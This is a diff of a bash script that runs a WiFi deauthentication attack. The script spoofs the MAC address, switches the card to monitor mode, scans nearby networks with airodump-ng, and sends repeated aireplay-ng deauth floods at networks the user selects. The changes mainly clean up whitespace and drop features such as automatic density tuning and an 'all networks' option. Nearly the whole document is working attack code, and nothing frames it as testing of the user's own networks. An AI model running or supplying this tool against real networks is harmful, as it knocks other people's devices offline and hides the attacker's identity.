@@ -7,8 +7,8 @@ DEBUG_MODE=false  # Set to true to see detailed output
 INTERFACE=""
 ORIGINAL_MAC=""
 ORIGINAL_IFACE=""
-SCAN_TIME=30      
-DEAUTH_STRENGTH=100 
+SCAN_TIME=30
+DEAUTH_STRENGTH=100
 ATTACK_DELAY=1 #change for crowded areas
 
 # -------------------
@@ -39,9 +39,11 @@ cleanup() {
 
     rm -f /tmp/aireplay_pid_*.txt
     rm -f scan_results-*.csv
-    rm -f networks.txt
     exit 0
 }
+
+
+
 
 # Check root privileges
 check_root() {
@@ -55,7 +57,7 @@ check_root() {
 select_interface() {
     echo "[*] Available wireless interfaces:"
     INTERFACES=$(iw dev | awk '$1=="Interface"{print $2}')
-    
+
     if [ -z "$INTERFACES" ]; then
         echo "[!] No wireless interfaces found. Exiting."
         exit 1
@@ -71,7 +73,7 @@ select_interface() {
 
     read -p "Select interface (number): " IFACE_INDEX
     INTERFACE=${INTERFACE_MAP[$IFACE_INDEX]}
-    
+
     if [ -z "$INTERFACE" ]; then
         echo "[!] Invalid selection. Exiting."
         exit 1
@@ -83,64 +85,38 @@ spoof_mac() {
     ORIGINAL_IFACE=$INTERFACE
     echo "[+] Saving original MAC address..."
     ORIGINAL_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
-    
+
     echo "[+] Changing MAC address..."
     ifconfig "$INTERFACE" down
     macchanger -r "$INTERFACE" &> /dev/null
     ifconfig "$INTERFACE" up
-    
     NEW_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
     echo "[+] MAC changed from $ORIGINAL_MAC to $NEW_MAC"
 }
+
+
 
 # Enable monitor mode
 enable_monitor_mode() {
     echo "[*] Enabling monitor mode on $INTERFACE..."
     airmon-ng check kill &> /dev/null
     airmon-ng start "$INTERFACE" &> /dev/null
-    
+
     # Verify monitor mode
     sleep 2
     local new_iface=$(airmon-ng | grep "$INTERFACE" | awk '{print $2}')
-    
-    # Check if interface name changed to *mon* OR if it is in monitor mode
-    local mode=$(iw dev "$new_iface" info 2>/dev/null | grep "type" | awk '{print $2}')
-    
-    if [[ "$new_iface" == *"mon"* ]] || [[ "$mode" == "monitor" ]]; then
-        if [ -n "$new_iface" ]; then
-             INTERFACE="$new_iface"
-        fi
+    if [[ "$new_iface" == *"mon"* ]]; then
+        INTERFACE="$new_iface"
         echo "[+] Monitor mode enabled on $INTERFACE"
     else
-        echo "[!] Failed to enable monitor mode. 'airmon-ng start' failed or interface not found."
+        echo "[!] Failed to enable monitor mode"
         exit 1
     fi
 }
 
-# Auto-detect parameters based on network density
-auto_detect_params() {
-    local network_count=$(wc -l < networks.txt)
-    network_count=$((network_count - 2)) # Subtract header lines
-
-    if [ "$network_count" -gt 10 ]; then
-        echo "[!] High network density detected ($network_count networks)."
-        ATTACK_DELAY=20
-        DEAUTH_STRENGTH=10 # Lower strength to avoid congestion
-    elif [ "$network_count" -gt 5 ]; then
-        echo "[!] Medium network density detected ($network_count networks)."
-        ATTACK_DELAY=15
-        DEAUTH_STRENGTH=50
-    else
-        echo "[*] Low network density detected ($network_count networks)."
-        ATTACK_DELAY=10
-        DEAUTH_STRENGTH=100
-    fi
-    echo "[+] Auto-configured: Delay=${ATTACK_DELAY}s, Strength=${DEAUTH_STRENGTH}"
-}
-
+# Scan for networks
 scan_networks() {
     echo "[*] Scanning for WiFi networks for $SCAN_TIME seconds..."
-    rm -f scan_results-*.csv
     xterm -e "airodump-ng --write scan_results --output-format csv -t WEP,WPA,OPN $INTERFACE --band abg" &
     SCAN_PID=$!
     sleep $SCAN_TIME
@@ -162,60 +138,51 @@ parse_results() {
         channel = $4
         privacy = $6
         power = $9
-        
+
         gsub(/^ +| +$/, "", essid)
         gsub(/"/, "", privacy)
-        
+
         if (essid == "" || bssid == "") next
-        
+
         printf "%s|%s|%s|%s|%s\n", power, essid, bssid, channel, privacy
-    }' | sort -nr | awk -F '|' '
+            }' | sort -nr | awk -F '|' '
     BEGIN {
         printf "%2s | %-25s | %-17s | %-3s | %-10s\n", "SN", "ESSID", "BSSID", "Chan", "Security"
         print "---------------------------------------------------------------"
     }
     {
-        printf "%2d | %-25s | %-17s | %-3s | %-10s\n", 
+        printf "%2d | %-25s | %-17s | %-3s | %-10s\n",
             NR, $2, $3, $4, $5
     }' > networks.txt
 }
-
 # Select target networks
 select_targets() {
     echo "[*] Available networks:"
-    cat networks.txt
-    
-    read -p "Enter target numbers (comma-separated) or 'all': " TARGET_ROWS
+            cat networks.txt
 
-    if [[ "$TARGET_ROWS" == "all" ]]; then
-        echo "[*] Selecting ALL networks..."
-        # Get all line numbers from networks.txt (skipping header)
-        TOTAL_LINES=$(wc -l < networks.txt)
-        ROWS=($(seq 1 $((TOTAL_LINES - 2))))
-    else
-        IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
-    fi
-    
+    read -p "Enter target numbers (comma-separated): " TARGET_ROWS
+    IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
+
     for row in "${ROWS[@]}"; do
-        ADJUSTED_ROW=$((row + 2)) 
-        
+        ADJUSTED_ROW=$((row + 2))
+
         LINE=$(sed -n "${ADJUSTED_ROW}p" networks.txt)
         if [[ -z "$LINE" ]]; then
             echo "[!] Invalid row: $row"
             continue
         fi
-        
+
         BSSID=$(echo "$LINE" | awk '{print $5}')
         CHANNEL=$(echo "$LINE" | awk '{print $7}')
         ESSID=$(echo "$LINE" | awk '{print $3}')
-        
+
         if [[ -n "$BSSID" && -n "$CHANNEL" && -n "$ESSID" ]]; then
             TARGET_NETWORKS+=("$BSSID,$CHANNEL,$ESSID")
         else
             echo "[!] Failed to parse network details for row: $row"
         fi
     done
-    
+
     if [[ ${#TARGET_NETWORKS[@]} -eq 0 ]]; then
         echo "[!] No valid targets selected. Exiting."
         exit 1
@@ -227,28 +194,26 @@ deauth_attack() {
     local bssid=$1
     local channel=$2
     local essid=$3
-    
+
     echo "[+] Attacking: $essid (BSSID: $bssid) on channel $channel"
-    
-    iw dev "$INTERFACE" set channel "$channel" &> /dev/null || \
-    iwconfig "$INTERFACE" channel "$channel" &> /dev/null || {
+
+    iw dev "$INTERFACE" set channel "$channel" HT20 &> /dev/null || {
         echo "[!] Failed to set channel $channel. Skipping..."
         return
     }
-    sleep 1 # Allow time for channel switch
-    
+
 
     aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
     AIREPLAY_PID=$!
     echo $AIREPLAY_PID > /tmp/aireplay_pid_$$.txt
-    
+
     # Monitor progress
     for ((i=1; i<=ATTACK_DELAY; i++)); do
         echo -ne "\r[+] Sending $DEAUTH_STRENGTH deauth packets... ($i/$ATTACK_DELAY sec)"
         sleep 1
     done
     echo ""
-    
+
     # Cleanup
     kill $AIREPLAY_PID &> /dev/null
     rm -f /tmp/aireplay_pid_$$.txt
@@ -288,7 +253,6 @@ fi
 
 scan_networks
 parse_results
-auto_detect_params
 select_targets
 
 echo "[+] Starting attack loop. Press Ctrl+C to stop."
